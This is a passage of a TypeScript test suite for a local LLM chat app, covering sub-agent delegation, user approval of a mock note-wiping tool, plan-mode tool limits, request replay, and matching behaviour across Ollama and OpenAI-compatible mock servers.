    expect(first).toBe('A')
    expect(second).toMatch(/^The sub-agent failed: /)
    expect(rest).toEqual([])
    await waitFor(() => listTraces(r.conversation.id).every((t) => t.status !== 'running'))
  })

  it('asks on one sub-agent’s card while another beside it finishes', async () => {
    const { childId } = await import('../src/shared/toolEvents')
    const { runs, off } = registerWipe()
    try {
      chat = (b, res, n) => {
        if (isChild(b)) {
          if (taskOf(b).includes('second')) return reply('B')(b, res, n)
          return hasToolResult(b) ? reply('Wiped.')(b, res, n) : void res.writeHead(200).end(toolCall('notes__wipe', {}))
        }
        return hasToolResult(b)
          ? reply('both')(b, res, n)
          : void res
              .writeHead(200)
              .end(callsTogether(['delegate', { task: 'the first: wipe the note' }], ['delegate', { task: 'the second' }]))
      }
      const r = start('wipe and look')
      const id = r.conversation.id
      // The second finishes while the first waits for the user.
      await waitFor(() => lastEvent(id, 0)?.awaiting && finished(id, 1), 2000)
      expect(lastEvent(id, 1)).toMatchObject({ tool: 'delegate', ok: true, child: { result: 'B' } })
      expect(lastEvent(id, 0)).toMatchObject({ tool: 'delegate', pending: true, awaiting: true })
      expect(runs).toEqual([])
      // Answered on its own card, with its child's id and the child's own index.
      approvals.decide(id, childId(r.assistantMessageId, 0), 0, 'once')
      const done = await doneEvent(id)
      expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['Wiped.', 'B'])
      expect(done.message.toolEvents.some((e) => e.pending || e.awaiting)).toBe(false)
      expect(runs).toEqual(['notes__wipe'])
      expect(approvals.waitingCount()).toBe(0)
    } finally {
      off()
    }
  })

  it('two sub-agents asking at once are answered one at a time, each on its own card', async () => {
    const { childId } = await import('../src/shared/toolEvents')
    const { runs, off } = registerWipe()
    try {
      chat = (b, res, n) => {
        if (isChild(b)) {
          const which = taskOf(b).includes('first') ? 'first' : 'second'
          return hasToolResult(b)
            ? reply(`Wiped the ${which}.`)(b, res, n)
            : void res.writeHead(200).end(toolCall('notes__wipe', { which }))
        }
        return hasToolResult(b)
          ? reply('both')(b, res, n)
          : void res.writeHead(200).end(callsTogether(['delegate', { task: 'the first' }], ['delegate', { task: 'the second' }]))
      }
      const r = start('wipe both')
      const id = r.conversation.id
      await waitFor(() => lastEvent(id, 0)?.awaiting && lastEvent(id, 1)?.awaiting, 2000)
      expect(approvals.waitingCount()).toBe(2)
      // Answering the second leaves the first asking.
      approvals.decide(id, childId(r.assistantMessageId, 1), 0, 'deny')
      await waitFor(() => finished(id, 1))
      expect(lastEvent(id, 0)).toMatchObject({ pending: true, awaiting: true })
      expect(approvals.waitingCount()).toBe(1)
      approvals.decide(id, childId(r.assistantMessageId, 0), 0, 'once')
      const done = await doneEvent(id)
      expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['Wiped the first.', 'Wiped the second.'])
      expect(done.message.toolEvents[1].child!.events[0]).toMatchObject({ tool: 'notes__wipe', declined: true })
      expect(done.message.toolEvents[0].child!.events[0]).toMatchObject({ tool: 'notes__wipe', ok: true })
      expect(runs).toEqual(['notes__wipe'])
    } finally {
      off()
    }
  })

  it('a call between two delegations runs between them, and the results keep call order', async () => {
    const order: string[] = []
    chat = (b, res, n) => {
      if (isChild(b)) {
        const which = taskOf(b).includes('first') ? 'first' : 'second'
        order.push(which)
        return reply(which === 'first' ? 'A' : 'B')(b, res, n)
      }
      return hasToolResult(b)
        ? reply('done')(b, res, n)
        : void res
            .writeHead(200)
            .end(
              callsTogether(['delegate', { task: 'the first' }], ['web_search', { query: 'between' }], ['delegate', { task: 'the second' }])
            )
    }
    web = (_p, res) => {
      order.push('search')
      res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Between', url: 'https://b.io', content: 'BETWEEN' }] }))
    }
    const r = start('mixed')
    const done = await doneEvent(r.conversation.id)
    expect(order).toEqual(['first', 'search', 'second'])
    expect(done.message.toolEvents.map((e) => e.tool)).toEqual(['delegate', 'web_search', 'delegate'])
    const results = toolMessagesIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)
    expect(results).toHaveLength(3)
    expect(results[0]).toBe('A')
    expect(results[1]).toContain('BETWEEN')
    expect(results[2]).toBe('B')
  })

  // A code session needs the macOS sandbox, as the session tests above do.
  it.runIf(process.platform === 'darwin')('a child in plan mode gets no write tools', async () => {
    const dir = tempDir('ollmost-service-plan-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-repo-'))
    writeFileSync(join(folder, 'README.md'), 'Hello\n')
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (b, res, n) =>
      isChild(b)
        ? reply('Surveyed.')(b, res, n)
        : hasToolResult(b)
          ? reply('done')(b, res, n)
          : void res.writeHead(200).end(delegateCall('Survey the folder.'))
    const r = service.send({ ...sendBody(session.id), content: 'survey it' })
    const done = await doneEvent(r.conversation.id)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'delegate', ok: true })
    expect(offeredIn(chatCalls[0])).toContain('delegate')
    const childReq = chatCalls.find(isChild)!
    expect(offeredIn(childReq)).toEqual(expect.arrayContaining(['read_file', 'list_files', 'search_files']))
    expect(offeredIn(childReq)).toEqual(expect.not.arrayContaining(['edit_file', 'write_file', 'run_command']))
    // The child works under the session's prompt, in plan mode, with its task.
    const system = String((childReq.messages as Array<{ content: string }>)[0].content)
    expect(system).toMatch(/<plan_mode>/)
    expect(system).toMatch(/<sub_agent>[\s\S]*Survey the folder\./)
  })
})

describe('replay', () => {
  it('re-sends a recorded body through its model’s provider, as recorded, and counts it', async () => {
    const sendWire = vi.spyOn(resolve('llama3.2').provider, 'sendWire')
    const base = ollama.handler
    const replays: Array<Record<string, unknown>> = []
    ollama.handler = (req, res) => {
      const first = (req.json.messages as Array<{ content: string }> | undefined)?.[0]
      if (req.url === '/api/chat' && first?.content === 'replay me') {
        replays.push(req.json)
        return void res.writeHead(200).end(
          JSON.stringify({
            message: { role: 'assistant', content: 'Replayed.' },
            done: true,
            prompt_eval_count: 4,
            eval_count: 2,
            eval_duration: 2_000_000
          })
        )
      }
      return base(req, res)
    }
    try {
      const c = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
      const detail = await replayRequest(c.id, 'ollama/llama3.2', {
        model: 'llama3.2',
        messages: [{ role: 'user', content: 'replay me', images: ['<image 3 KB>'] }],
        stream: true
      })
      expect(sendWire).toHaveBeenCalledOnce()
      // As recorded, less the image placeholder, and not streamed.
      expect(JSON.stringify(replays[0])).toBe('{"model":"llama3.2","messages":[{"role":"user","content":"replay me"}],"stream":false}')
      expect(detail).toMatchObject({
        kind: 'replay',
        endpoint: `${ollama.url}/api/chat`,
        status: 'ok',
        promptTokens: 4,
        completionTokens: 2,
        response: { content: 'Replayed.' },
        timing: { evalMs: 2 }
      })
      expect(all<{ kind: string }>('SELECT kind FROM usage_events WHERE conversation_id = ?', c.id)).toEqual([{ kind: 'replay' }])
    } finally {
      ollama.handler = base
      sendWire.mockRestore()
    }
  })
})

// ---- One reply loop, both dialects ----
// The same scripted conversation runs against the Ollama mock (NDJSON) and the OpenAI-compatible mock (SSE). Both must
// save the same reply, tool events and usage rows.

afterAll(() => openaiServer.close())
const DIALECTS: Dialect[] = ['ollama', 'openai']
let openaiId = ''
const keyFor = (d: Dialect) => toModelKey(d === 'ollama' ? 'ollama' : openaiId, 'llama3.2')
const asksUsage = (b: Record<string, unknown>) => !!(b.stream_options as { include_usage?: boolean } | undefined)?.include_usage

interface Script {
  prompt: string
  turn: (body: Record<string, unknown>, n: number) => Turn
  web?: (path: string, res: ServerResponse) => unknown
  opts?: { maxToolRounds?: number }
  /** Press Stop (quietly, as deleting the chat does) once the first text arrives. */
  stop?: boolean
  /** A pause between the server's chunks. */
  pauseMs?: number
}

let pageNo = 0
const SCRIPTS: Record<string, Script> = {
  'plain reply': { prompt: 'hello', turn: () => ({ thinking: 'Greet them.', content: 'Hi there', usage: { prompt: 10, completion: 3 } }) },
  'tool round': {
    prompt: 'look it up',
    turn: (_b, n) =>
      n === 1
        ? { content: 'Let me check.', toolCalls: [{ name: 'web_search', args: { query: 'ollmost' } }] }
        : { content: 'Found it.', usage: { prompt: 10, completion: 3 } },
    web: (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
  },
  // Longer than the think splitter holds back, so the OpenAI mock's text shows (and Stop can be pressed) at once too.
  'stop mid-stream': { prompt: 'hello', turn: () => ({ content: 'partial reply '.repeat(6), cut: 'hang' }), stop: true },
  'dropped stream': { prompt: 'hello', turn: () => ({ content: 'Half an ans', cut: 'drop' }) },
  'round limit': {
    prompt: 'dig deep',
    turn: (b, n) => (b.tools ? { toolCalls: [{ name: 'web_search', args: { query: `q${n}` } }] } : { content: 'Stopped early' }),
    web: (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] })),
    opts: { maxToolRounds: 3 }
  },
  // The mock model has an 8,192-token window on both endpoints: 12K-character pages overflow it by the third request.
  'result shortening': {
    prompt: 'compare these two pages',
    turn: (_b, n) =>
      n <= 2
        ? { toolCalls: [{ name: 'web_fetch', args: { url: `https://p${n}.io` } }], usage: { prompt: 100, completion: 5 } }
        : { content: 'Compared.', usage: { prompt: 100, completion: 3 } },
    web: (_p, res) =>
      res.writeHead(200).end(JSON.stringify({ title: `Page ${++pageNo}`, content: `${'x'.repeat(12_000)} MARK-${pageNo}`, links: [] }))
  },
  // #175: two sub-agents delegated in one round run at the same time (Settings allows 3 by default). A child is told
  // apart by its system prompt. Both children report the same counts, so their usage rows match whichever lands first.
  'two sub-agents at once': {
    prompt: 'research both',
    turn: (b) => {
      const messages = b.messages as Array<{ role: string; content: unknown }>
      if (String(messages[0].content).includes('<sub_agent>')) {
        const task = String(messages.find((m) => m.role === 'user')!.content)
        return { content: task.includes('first') ? 'A' : 'B', usage: { prompt: 10, completion: 1 } }
      }
      return messages.some((m) => m.role === 'tool')
        ? { content: 'Both done.', usage: { prompt: 10, completion: 3 } }
        : {
            toolCalls: [
              { name: 'delegate', args: { task: 'the first' } },
              { name: 'delegate', args: { task: 'the second' } }
            ],
            usage: { prompt: 10, completion: 5 }
          }
    }
  }
}

/** What a reply saved, without what depends on the clock, and its usage rows without the endpoint in the model's key. */
function savedReply(messageId: string) {
  const m = getMessage(messageId)!
  const { durationMs: _d, tokensPerSecond: _t, thinkingMs: _k, ...stats } = m.stats ?? {}
  const rows = all<{
    model: string
    kind: string
    prompt_tokens: number
    completion_tokens: number
    cost_usd: number | null
    estimated: number
    billing: string
  }>(
    `SELECT model, kind, prompt_tokens, completion_tokens, cost_usd, estimated, billing FROM usage_events
     WHERE message_id = ? AND kind != 'title' ORDER BY created_at`,
    messageId
  )
  return {
    content: m.content,
    thinking: m.thinking,
    thinkingSegments: m.thinkingSegments?.map(({ ms: _ms, ...s }) => s) ?? null,
    failed: m.error !== null,
    stats,
    toolEvents: m.toolEvents,
    usage: rows.map((r) => ({ ...r, model: r.model.slice(r.model.indexOf('/') + 1) }))
  }
}

async function runScript(dialect: Dialect, script: Script) {
  setApiKey('test-key')
  pageNo = 0
  events.length = 0
  chatCalls = []
  web = script.web ?? ((_p, res) => res.writeHead(404).end())
  chat = (b, res, n) => writeTurn(res, dialect, script.turn(b, n), { includeUsage: asksUsage(b), pauseMs: script.pauseMs })
  const r = service.send(
    {
      conversationId: null,
      projectId: null,
      content: script.prompt,
      attachmentIds: [],
      model: keyFor(dialect),
      think: null,
      skills: [],
      toolSources: []
    },
    script.opts
  )
  if (script.stop) {
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true })
  } else await doneEvent(r.conversation.id)
  return {
    calls: chatCalls,
    saved: savedReply(r.assistantMessageId),
    error: getMessage(r.assistantMessageId)?.error ?? null,
    messageId: r.assistantMessageId
  }
}

describe('one reply loop, both dialects', () => {
  afterAll(() => writeModelOverrides(`${openaiId}/llama3.2`, {}))
  beforeAll(() => {
    openaiId = addEndpoint({ name: 'OpenAI mock', baseUrl: `${openaiServer.url}/v1`, kind: 'openai', flavor: 'generic' }).id
    // A generic server reports no capabilities, so the built-in question tool waits for the user to say tools work
    // (the Ollama mock reports them); with both offering the same tools, the two dialects can be compared.
    writeModelOverrides(`${openaiId}/llama3.2`, { tools: true })
    openaiServer.handler = (req, res) => {
      if (req.url === '/v1/models')
        return res.writeHead(200).end(JSON.stringify({ object: 'list', data: [{ id: 'llama3.2', object: 'model' }] }))
      // Titles are read whole, apart from the scripted chat, as on the Ollama mock.
      if (req.url === '/v1/chat/completions' && req.json.stream !== true) {
        titleCalls.push(req.json)
        return res.writeHead(200).end(completionJson('A title'))
      }
      if (req.url === '/v1/chat/completions') {
        chatCalls.push(req.json)
        return chat(req.json, res, chatCalls.length)
      }
      return res.writeHead(404).end()
    }
  })

  describe.each(DIALECTS)('over %s', (dialect) => {
    it('streams a reply with its thinking, and saves it with the server’s counts', async () => {
      const { saved } = await runScript(dialect, SCRIPTS['plain reply'])
      expect(saved).toMatchObject({ content: 'Hi there', thinking: 'Greet them.', failed: false })
      expect(saved.stats).toMatchObject({ promptTokens: 10, completionTokens: 3, doneReason: 'stop' })
      expect(saved.usage).toEqual([
        { model: 'llama3.2', kind: 'chat', prompt_tokens: 10, completion_tokens: 3, cost_usd: 0, estimated: 0, billing: 'local' }
      ])
    })

    it('runs a tool round, handing the result back in its own dialect', async () => {
      const { saved, calls } = await runScript(dialect, SCRIPTS['tool round'])
      expect(saved.content).toBe('Let me check.\n\nFound it.')
      expect(saved.toolEvents).toEqual([expect.objectContaining({ tool: 'web_search', ok: true, at: 'Let me check.'.length })])
      const second = calls[1].messages as Array<Record<string, unknown>>
      const echo = second.find((m) => m.role === 'assistant' && Array.isArray(m.tool_calls))!
      const result = second.find((m) => m.role === 'tool')!
      expect(result.content).toContain('https://k.io')
      if (dialect === 'openai') {
        expect(echo.tool_calls).toEqual([
          { id: 'call_mock_0', type: 'function', function: { name: 'web_search', arguments: '{"query":"ollmost"}' } }
        ])
        expect(result.tool_call_id).toBe('call_mock_0')
      } else {
        // An Ollama body never carries a tool-call id (PR 1's rule).
        expect(echo.tool_calls).toEqual([{ function: { name: 'web_search', arguments: { query: 'ollmost' } } }])
        expect(result.tool_name).toBe('web_search')
      }
    })

    // Review Focus #4, at the service level. The saved reply is trimmed at its end, as every reply is.
    it('saves the partial reply on Stop, with estimated usage and no error', async () => {
      const { saved, error } = await runScript(dialect, SCRIPTS['stop mid-stream'])
      expect(saved).toMatchObject({ content: 'partial reply '.repeat(6).trimEnd(), failed: false })
      expect(error).toBeNull()
      expect(saved.stats.estimated).toBe(true)
      expect(saved.usage).toEqual([expect.objectContaining({ estimated: 1, completion_tokens: 21 })])
    })

    it('saves a dropped stream with its text and says the connection dropped', async () => {
      const { saved, error } = await runScript(dialect, SCRIPTS['dropped stream'])
      expect(saved).toMatchObject({ content: 'Half an ans', failed: true })
      expect(error).toMatch(/dropped before the reply finished/)
    })

    it('ends a tool-happy model at the round limit with a tool-free last request', async () => {
      const { saved, calls } = await runScript(dialect, SCRIPTS['round limit'])
      expect(calls).toHaveLength(3)
      expect(calls.at(-1)!.tools).toBeUndefined()
      expect(saved.content).toBe('Stopped early')
      expect(saved.stats.toolRoundLimit).toBe(3)
    })

    it('shortens this turn’s older results when the next request would overflow', async () => {
      const { saved, calls } = await runScript(dialect, SCRIPTS['result shortening'])
      const results = (calls[2].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
      expect(results[0].content).toMatch(/^\[Ollmost shortened this earlier web_fetch result/)
      expect(results[1].content).toContain('MARK-2')
      expect(saved.stats.shortenedToolResults).toBe(1)
    })

    // #175's batches over either dialect: the results keep call order, and each names the call it answers.
    it('runs two sub-agents at once and hands each result back under its own call, in call order', async () => {
      const { saved, calls } = await runScript(dialect, SCRIPTS['two sub-agents at once'])
      expect(saved).toMatchObject({ content: 'Both done.', failed: false })
      expect(saved.toolEvents.map((e) => [e.tool, e.child?.result])).toEqual([
        ['delegate', 'A'],
        ['delegate', 'B']
      ])
      // The children finish before the parent asks again, so its last request is the one with both results.
      const results = (calls.at(-1)!.messages as Array<Record<string, unknown>>).filter((m) => m.role === 'tool')
      expect(results.map((m) => m.content)).toEqual(['A', 'B'])
      if (dialect === 'openai') {
        expect(results.map((m) => m.tool_call_id)).toEqual(['call_mock_0', 'call_mock_1'])
      } else {
        // An Ollama body names the tool and never carries an id (PR 1's rule).
        expect(results.map((m) => m.tool_name)).toEqual(['delegate', 'delegate'])
      }
    })

    // Paced so the first token and the end are well past the 50 ms a clocked round needs.
    it('times tok/s from the first token when the server reports no generation time', async () => {
      const { messageId } = await runScript(dialect, { ...SCRIPTS['plain reply'], pauseMs: 50 })
      expect(getMessage(messageId)!.stats!.tokensPerSecond).toBeGreaterThan(0)
    })

    // A round that only calls a tool streams no text (LM Studio sends it no content at all, FINDINGS Q2), so nothing
    // times it: its tokens stay out of the figure.
    it('works tok/s out from the timed rounds’ tokens only, leaving out a tool-only round’s', async () => {
      const { messageId } = await runScript(dialect, {
        prompt: 'look it up',
        turn: (_b, n) =>
          n === 1
            ? { toolCalls: [{ name: 'web_search', args: { query: 'ollmost' } }], usage: { prompt: 10, completion: 25 } }
            : { content: 'Found it.', usage: { prompt: 10, completion: 3 }, genMs: 1500 },
        web: SCRIPTS['tool round'].web
      })
      // The text round's 3 tokens in the server's own 1.5 s; the tool round's 25 as well would read 18.7.
      expect(getMessage(messageId)!.stats).toMatchObject({ completionTokens: 28, tokensPerSecond: 2 })
    })

    // The debugger reads a request by its trace's dialect, and Copy as curl and replay go by its endpoint.
    it('records its dialect and endpoint in the chat round’s trace and the title’s', async () => {
      const { messageId } = await runScript(dialect, SCRIPTS['plain reply'])
      const conversationId = getMessage(messageId)!.conversationId
      const title = await waitFor(() => listTraces(conversationId).find((t) => t.kind === 'title' && t.status !== 'running'))
      const round = listTraces(conversationId).find((t) => t.kind === 'chat')!
      // Neither endpoint has a key of its own, and neither is ollama.com, so no request carried one.
      const target =
        dialect === 'ollama'
          ? { dialect: 'ollama', auth: null, endpointId: 'ollama', endpointName: 'Ollama' }
          : { dialect: 'openai', auth: null, endpointId: openaiId, endpointName: 'OpenAI mock' }
      expect(getTrace(round.id)).toMatchObject(target)
      expect(getTrace(title.id)).toMatchObject(target)
    })
  })

  it('records that a keyed endpoint’s requests carried its key, and never the key itself', async () => {
    const key = 'sk-endpoint-key-kept-out-of-traces'
    const base = openaiServer.handler
    const sent: Array<string | undefined> = []
    openaiServer.handler = (req, res) => {
      sent.push(req.headers.authorization)
      return base(req, res)
    }
    setEndpointKey(openaiId, key)
    try {
      const { messageId } = await runScript('openai', SCRIPTS['plain reply'])
      const conversationId = getMessage(messageId)!.conversationId
      await waitFor(() => listTraces(conversationId).some((t) => t.kind === 'title' && t.status !== 'running'))
      // The key was sent, to its own endpoint, so the traces had it to hand.
      expect(sent).toContain(`Bearer ${key}`)
      const traces = listTraces(conversationId)
      expect(traces.map((t) => t.kind).sort()).toEqual(['chat', 'title'])
      for (const t of traces) {
        const detail = getTrace(t.id)
        expect(detail).toMatchObject({ dialect: 'openai', auth: 'endpoint', endpointId: openaiId, endpointName: 'OpenAI mock' })
        expect(JSON.stringify(detail)).not.toContain(key)
      }
    } finally {
      setEndpointKey(openaiId, null)
      openaiServer.handler = base
    }
  })

  it('reads a trace stored before traces kept their target as Ollama’s, or as OpenAI’s by its address', () => {
    const c = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
    // A row as Ollmost stored it before endpoints (and PR 3, for its OpenAI requests): no dialect, auth or endpoint.
    const stored = (id: string, endpoint: string) =>
      run(
        `INSERT INTO traces (id, conversation_id, message_id, kind, model, round, status, started_at, summary, data)
         VALUES (?, ?, NULL, 'chat', 'llama3.2', 1, 'ok', ?, '', ?)`,
        id,
        c.id,
        Date.now(),
        JSON.stringify({ endpoint, request: { model: 'llama3.2', messages: [] }, response: {}, timing: {} })
      )
    stored('before-endpoints', `${ollama.url}/api/chat`)
    stored('pr3-openai', `${openaiServer.url}/v1/chat/completions`)
    const unknown = { auth: null, endpointId: null, endpointName: null }
    expect(getTrace('before-endpoints')).toMatchObject({ dialect: 'ollama', ...unknown })
    expect(getTrace('pr3-openai')).toMatchObject({ dialect: 'openai', ...unknown })
  })

  // A title is read whole: an OpenAI response keeps its finish reason in choices[], where the debugger doesn't look.
  it('records an OpenAI title’s finish reason in its trace’s stats', async () => {
    const { messageId } = await runScript('openai', SCRIPTS['plain reply'])
    const conversationId = getMessage(messageId)!.conversationId
    const title = () => listTraces(conversationId).find((t) => t.kind === 'title' && t.status !== 'running')
    await waitFor(() => !!title())
    const final = getTrace(title()!.id)!.response.final
    expect(final).toMatchObject({ finish_reason: 'stop', usage: { prompt_tokens: 20, completion_tokens: 2 } })
    expect(final).not.toHaveProperty('choices')
  })

  // A server that reports nothing may not take a tools array at all, so a plain chat there sends none.
  it('does not offer the question tool where a server has not said tools work', async () => {
    const key = `${openaiId}/llama3.2`
    const before = readModelProfile(key).overrides
    const offered = () => ((chatCalls[0].tools ?? []) as Array<{ function: { name: string } }>).map((t) => t.function.name)
    writeModelOverrides(key, {})
    invalidateProviders()
    try {
      await runScript('openai', SCRIPTS['plain reply'])
      expect(offered()).not.toContain('ask_user')
      // Once the user says it does, it's offered.
      writeModelOverrides(key, { tools: true })
      await runScript('openai', SCRIPTS['plain reply'])
      expect(offered()).toContain('ask_user')
    } finally {
      writeModelOverrides(key, before)
    }
  })

  it.each(Object.keys(SCRIPTS))('%s: both dialects save the same reply, tool events and usage', async (name) => {
    const ollamaRun = await runScript('ollama', SCRIPTS[name])
    const openaiRun = await runScript('openai', SCRIPTS[name])
    expect(openaiRun.saved).toEqual(ollamaRun.saved)
  })
})
